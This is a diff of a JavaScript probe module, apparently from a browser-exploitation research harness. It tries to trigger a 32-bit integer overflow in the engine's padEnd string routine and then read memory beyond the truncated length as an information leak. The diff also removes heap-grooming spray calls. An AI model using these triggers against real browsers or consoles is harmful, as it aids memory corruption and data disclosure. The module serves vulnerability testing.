@@ -1,48 +1,62 @@
-import { Groomer } from '../mod_groomer.js';
-
 export default {
     id:       'STRING_MATH_INTEGER_OVERFLOW',
     category: 'Boundary',
-    risk:     'HIGH',
+    risk:     'CRITICAL',
     description:
-        'Integer overflow na matemática de strings (WTFString.cpp). ' +
-        'O JSString Heap é fragmentado antes para garantir que as novas alocações ' +
-        'caiam em buracos corrompidos se o tamanho truncado de 32-bits for usado.',
+        'Heap Buffer Overflow no C++ WTF::String. Abusa do cálculo de 32-bits na função padEnd(). ' +
+        'O tamanho alvo excede 0xFFFFFFFF, causando truncamento interno. O motor aloca um buffer ' +
+        'pequeno, mas o loop de cópia tenta preencher a RAM inteira.',
 
     setup: function() {
-        this.smallStr = "A";
         this.results = {};
+        // Criamos uma string base razoável (16MB) para não esgotar a RAM do PS4 de imediato
+        this.baseString = "A".repeat(16 * 1024 * 1024); 
     },
 
     trigger: function() {
-        // 🚨 Grooming: Criamos o caos no JSString Heap
-        let stringTrash = Groomer.sprayStrings(32, 2000);
-        Groomer.punchHoles(stringTrash, 2);
-
         try {
-            // O cálculo (1 * 0xFFFFFFFF) pode truncar e alocar menos memória do que escreve
-            this.corrupted1 = this.smallStr.repeat(0xFFFFFFFF);
-            this.results.repLen = this.corrupted1.length;
-        } catch(e) { this.results.repErr = e.constructor.name; }
-
-        try {
-            // padStart tenta calcular (0xFFFFFFFF - 1)
-            this.corrupted2 = this.smallStr.padStart(0xFFFFFFFF, "B");
-            this.results.padLen = this.corrupted2.length;
-        } catch(e) { this.results.padErr = e.constructor.name; }
+            // O GATILHO: 
+            // 0xFFFFFFFF é o limite de 32-bits (4294967295).
+            // Passamos um número marginalmente superior. Se o C++ for vulnerável,
+            // (0xFFFFFFFF + 5) transforma-se internamente em '4'.
+            // Ele aloca 4 bytes, mas o motor de cópia usa o valor gigante e transborda!
+            let toxicLength = 0xFFFFFFFF + 5; 
+            
+            // Tentamos forçar a criação da string corrompida
+            this.results.corruptedStr = this.baseString.padEnd(toxicLength, "B");
+            
+        } catch(e) {
+            // O LLInt (interpretador) deve apanhar isto e atirar "RangeError: Invalid string length"
+            this.results.error = e.constructor.name;
+        }
     },
 
     probe: [
-        s => s.results.repLen ?? s.results.repErr,
-        s => s.results.padLen ?? s.results.padErr,
-        s => s.corrupted1 ? s.corrupted1.charCodeAt(0) : null,
-        s => s.corrupted2 ? s.corrupted2.charCodeAt(0) : null,
+        // Probe 0: O motor C++ bloqueou com RangeError?
+        s => s.results.error || 'Matemática Aceite! Cuidado!',
+        
+        // Probe 1: O Leitor de Overflow
+        s => {
+            if (s.results.corruptedStr) {
+                try {
+                    // Se a string foi criada, o seu tamanho pode estar truncado (ex: length == 4).
+                    // Vamos tentar ler um índice muito além do tamanho truncado.
+                    // Se ler memória RAM, temos um Info Leak brutal.
+                    let charCode = s.results.corruptedStr.charCodeAt(100);
+                    if (!isNaN(charCode) && charCode !== 65 && charCode !== 66) {
+                        return charCode; // Dispara o STALE DATA no HUD
+                    }
+                    return 'Leu Zeros/Seguro';
+                } catch(e) {
+                    return `Crash Seguro na Leitura`;
+                }
+            }
+            return 0; // Protegido (Baseline)
+        }
     ],
 
     cleanup: function() {
-        this.smallStr = null;
-        this.corrupted1 = null;
-        this.corrupted2 = null;
+        this.baseString = null;
         this.results = {};
     }
 };
